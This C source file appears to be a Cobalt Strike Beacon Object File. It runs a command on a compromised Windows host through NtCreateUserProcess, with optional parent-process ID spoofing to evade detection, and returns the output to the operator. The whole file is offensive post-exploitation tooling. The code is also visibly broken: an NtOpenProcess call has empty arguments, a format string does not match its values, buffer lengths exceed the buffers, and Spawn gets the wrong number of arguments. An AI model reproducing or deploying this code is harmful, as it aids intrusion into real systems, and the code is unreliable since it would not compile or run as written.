#include <windows.h>
#include <beacon.h>
#include <win32.h>

void go(_In_ char* args, _In_ int argc)
{
    datap Parser     = { 0 };
    
    BOOL Result      = FALSE;

    WCHAR wCommand[512];
    PSTR  Command     = NULL;
    DWORD CommandLen  = 0x00;

    WCHAR wTargetProc[512];
    PSTR  TargetProc  = NULL;
    DWORD TargetLen   = 0x00;

    WCHAR wCurDir[512];
    PSTR  CurDir      = NULL;
    DWORD CurDirLen   = 0x00;

    DWORD PPid      = 0x00;
    BOOL  BlockDlls = FALSE;

    BeaconDataParse( &Parser, args, argc );

    //BeaconPrintf("Count of args: %d", argc);

    //BeaconDataStoreGetItem();

    TargetProc = BeaconDataExtract( &Parser, &TargetLen );
    if ( TargetProc == NULL ){
        PPid = BeaconDataInt( &Parser );
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PPid configured to %d\n", PPid);
    }
    
    Command    = BeaconDataExtract( &Parser, &CommandLen );
    CurDir     = BeaconDataExtract( &Parser, &CurDirLen );
    PPid       = BeaconDataInt( &Parser );

    Result = toWideChar( TargetProc, wTargetProc, 1024 );
    Result = toWideChar( Command, wCommand, 1024 );
    Result = toWideChar( CurDir, wCurDir, 1024 );

    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[+] Parsed Args:\n"
        "   - Target Process: %ls\n"
        "   - Command Line: %ls\n"
        "   - Current Directory: %ls\n"
        "   - PPid: %d\n"
        "   - Argue: %ls\n",
        wTargetProc, wCommand, wCurDir, PPid
    );

    if ( !Spawn( wTargetProc, wCommand, wCurDir, PPid, NULL, NULL ) ) 
       return;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawn execution succeeded!");

    return;
}

BOOL Spawn(
    _In_      PWSTR  TargetProc,
    _In_      PWSTR  Command,
    _In_      PWSTR  CurrentDir,
    _In_opt_  DWORD  PPid,
    _In_opt_  BOOL   BlockDlls,
    _Out_opt_ HANDLE *hProc,
    _Out_opt_ HANDLE *hThr
)
{
    NTSTATUS                     Status    = 0x00;
    PRTL_USER_PROCESS_PARAMETERS ProcParam = NULL;
    CLIENT_ID                    ClientId  = { 0 };
    UNICODE_STRING               ImgPath   = { 0 },
                                 CmdLine   = { 0 },
                                 CurDir    = { 0 };
    PPS_ATTRIBUTE_LIST           AttributeList = (PPS_ATTRIBUTE_LIST)KERNEL32$HeapAlloc( KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof( PS_ATTRIBUTE_LIST ) );

    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    InitUnicodeString( &ImgPath, TargetProc);
    InitUnicodeString( &CmdLine, Command );
    InitUnicodeString( &CurDir, CurrentDir );

    if ( KERNEL32$CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE ) {
        BeaconPrintf(CALLBACK_ERROR, "[X] CreatePipe for stdout failed.");
        return FALSE;
    }

    Status = NTDLL$RtlCreateProcessParametersEx( &ProcParam, &ImgPath, NULL, &CurDir, &CmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED );
    if (Status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[X] RtlCreateProcessParametersEx failed with status: 0x%X", Status); 
        return FALSE;
    }

    ProcParam->StandardError  = hStdOutPipeWrite;
    ProcParam->StandardOutput = hStdOutPipeWrite;
    ProcParam->StandardInput  = NULL;

    AttributeList->TotalLength = sizeof( PS_ATTRIBUTE_LIST );

    AttributeList->Attributes[0].Attribute  = PS_ATTRIBUTE_IMAGE_NAME;
    AttributeList->Attributes[0].Size       = ImgPath.Length;
    AttributeList->Attributes[0].Value      = ( ULONG_PTR )ImgPath.Buffer;

    if ( PPid != 0x00 )
    {
        HANDLE  hParentProcess = NULL;
        
        NTDLL$NtOpenProcess( &hParentProcess, PROCESS_ALL_ACCESS, ,  );

        AttributeList->Attributes[1].Attribute	= PS_ATTRIBUTE_PARENT_PROCESS;
        AttributeList->Attributes[1].Size		= sizeof(HANDLE);
        AttributeList->Attributes[1].Value		= hParentProcess;
    }

    if ( BlockDlls )
    {

    }

    PS_CREATE_INFO CreateInfo = {
        .Size  = sizeof( PS_CREATE_INFO ),
        .State = PsCreateInitialState
    };
    
    Status = NTDLL$NtCreateUserProcess( &hProc, &hThr, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcParam, &CreateInfo, AttributeList );
    if (Status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[X] NtCreateUserProcess failed with status: 0x%X", Status); 
        return FALSE;
    }

    NTDLL$NtClose(hStdOutPipeWrite);

    UCHAR* pOutputBuffer = NULL;
    UCHAR  buf[1024 + 1] = { 0 };
    DWORD  dwBufferSize  = 0;
    DWORD  dwRead        = 0;
    BOOL   SuccessFul    = FALSE;

    pOutputBuffer = (UCHAR*)KERNEL32$LocalAlloc( LPTR, sizeof(UCHAR) );

    do {
        SuccessFul = KERNEL32$ReadFile( hStdOutPipeRead, buf, 1024, &dwRead, NULL );

        if (dwRead == 0) {
            break;
        }

        pOutputBuffer = (UCHAR*)KERNEL32$LocalReAlloc(pOutputBuffer, dwBufferSize + dwRead, LMEM_MOVEABLE | LMEM_ZEROINIT);

        MemCopy(pOutputBuffer + dwBufferSize, buf, dwRead);
        dwBufferSize += dwRead;
        MemSet(buf, 0, sizeof(buf));

    } while (SuccessFul == TRUE);

    if (pOutputBuffer != NULL) {
        BeaconOutput(CALLBACK_OUTPUT, pOutputBuffer, dwBufferSize);        
        KERNEL32$LocalFree(pOutputBuffer);
    }

    NTDLL$NtClose(hStdOutPipeRead);

    return TRUE;
}

SIZE_T StringLengthW(_In_ LPCWSTR String)
{
    LPCWSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

void InitUnicodeString(_Out_ PUNICODE_STRING UsStruct, _In_opt_ PCWSTR Buffer)
{
    if ((UsStruct->Buffer = (PWSTR)Buffer))
    {
        unsigned int Length = StringLengthW(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc)
            Length = 0xfffc;

        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }
    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

PVOID MemCopy( _Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length){
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

VOID MemZero( _Inout_ PVOID Destination, _In_ SIZE_T Size){
	PULONG Dest = (PULONG)Destination;
	SIZE_T Count = Size / sizeof(ULONG);

	while (Count > 0)
	{
		*Dest = 0;
		Dest++;
		Count--;
	}

	return;
}

PVOID MemSet(void* Destination, int Value, size_t Size){
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}